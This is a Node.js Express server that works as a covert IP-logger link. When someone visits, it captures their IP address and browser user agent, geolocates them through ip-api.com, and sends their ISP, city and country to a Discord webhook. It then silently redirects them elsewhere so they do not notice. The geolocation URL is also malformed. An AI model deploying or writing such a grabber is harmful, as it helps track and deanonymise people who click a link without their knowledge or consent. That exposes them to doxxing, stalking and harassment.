const express = require('express');
const axios = require('axios');
const app = express();

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 

app.get('/', async (req, res) => {
    // 1. Grab raw string header from proxy
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    
    // 2. FIXED: Safely extracts the very first IP before the first comma without arrays or brackets
    let clientIp = rawIp.replace(/,.*$/, '').trim();

    // 3. Fallback for testing environments
    if (!clientIp || clientIp === '::1' || clientIp === '127.0.0.1') {
        clientIp = '8.8.8.8'; 
    }

    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (DISCORD_WEBHOOK_URL) {
        try {
            // 4. Standard string concatenation
            const apiUrl = 'http://ip-api.com' + clientIp + '?fields=61439';
            const geoResponse = await axios.get(apiUrl);
            const geoData = geoResponse.data;

            const discordPayload = {
                embeds: [{
                    title: "Visitor Logged",
                    color: 15548997, 
                    description: "A user has accessed the tracking link.",
                    fields: [
                        { name: "IP Address", value: "`" + clientIp + "`", inline: true },
                        { name: "ISP Network", value: "`" + (geoData.isp || "Unknown") + "`", inline: true },
                        { name: "Location", value: "`" + (geoData.city || "Unknown") + ", " + (geoData.country || "Unknown") + "`", inline: false },
                        { name: "Device / Agent", value: "```" + userAgent + "```", inline: false }
                    ],
                    footer: {
                        text: "System Monitor"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            axios.post(DISCORD_WEBHOOK_URL, discordPayload).catch(err => {
                console.error("Webhook Delivery Failed:", err.message);
            });

        } catch (error) {
            console.error("Geo Data Retrieval Error:", error.message);
        }
    }

    res.redirect(302, REDIRECT_URL);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
